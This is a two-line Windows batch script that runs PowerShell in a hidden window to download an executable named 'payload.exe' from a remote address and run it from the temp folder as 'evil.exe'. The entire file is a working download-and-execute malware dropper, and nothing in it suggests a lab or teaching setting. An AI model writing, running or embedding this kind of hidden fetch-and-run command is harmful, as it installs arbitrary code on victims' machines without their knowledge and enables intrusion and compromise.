@echo off
powershell -w hidden -c "Invoke-WebRequest http://10.0.0.1/payload.exe -OutFile %TEMP%\evil.exe; Start-Process %TEMP%\evil.exe"
